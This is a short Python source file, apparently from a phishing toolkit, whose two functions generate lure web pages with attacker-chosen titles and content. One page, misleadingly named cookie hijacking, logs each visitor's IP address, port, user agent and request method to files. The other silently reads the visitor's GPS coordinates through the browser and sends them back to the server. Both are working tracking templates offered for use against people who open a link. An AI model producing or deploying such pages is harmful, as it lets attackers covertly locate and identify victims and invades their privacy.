#-*-coding:utf-8-*-
# Coded By Deray
'''
	 Rebuild Copyright Can't make u real programmer
'''
# Report Bug On My Other Sosmed
# instagram: @reyy05_
# facebook: https://facebook.com/achmad.luthfi.hadi.3

def cookiejack(b, c, d):
	haha ="""
<html>
<head>
	<title>{}</title>
</head>
<body>
<script>alert('{}');</script>
<?php

	 /* (C) Copyright 407 Authentic Exploit
       Rebuild Copyright Can't make u real programmer:)
       Coded By Deray */
       
	$LOG=array(
		"ip" => $_SERVER["HTTP_X_FORWARDED_FOR"],
		"pr" => $_SERVER["REMOTE_PORT"],
		"ua" =>$_SERVER["HTTP_USER_AGENT"],
		"rq" =>$_SERVER["REQUEST_METHOD"]);
	$js=json_encode($LOG);
	$b=fopen("loggedIP.txt","a+");
	$c=fopen("haha.txt","w");
	fwrite($b,"$js\n");
	fwrite($c,"$js\n");
	fclose($b);
?>
{}
</body>
</html>
	""".format(b, c, d)
	open('raw/server/cookieHighJacking/index.php', 'w').write(haha)
	
	
def gps(b,c,d):
	haha="""
<html>
<head>
<title>%s</title>
</head>
<body>
<script>alert('%s');</script>
<script>
/*
	(C) Copyright 407 Authentic Exploit
	Rebuild Copyright Can't make u real programmer:)
	Coded By Deray
*/
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    alert("Try to open via  Chrome or Uc Mini ");
  }
}

function showPosition(position) {
  var a = position.coords.latitude;
  var b = position.coords.longitude;
  var c = new XMLHttpRequest();
  c.open("GET","./loc.php?lat="+a+"&lon="+b,true);
  c.send();
}
getLocation();
showPosition();
</script>
%s
</body>
</html>
	"""%(b,c,d)
	open("raw/server/gps/index.php","w").write(haha)
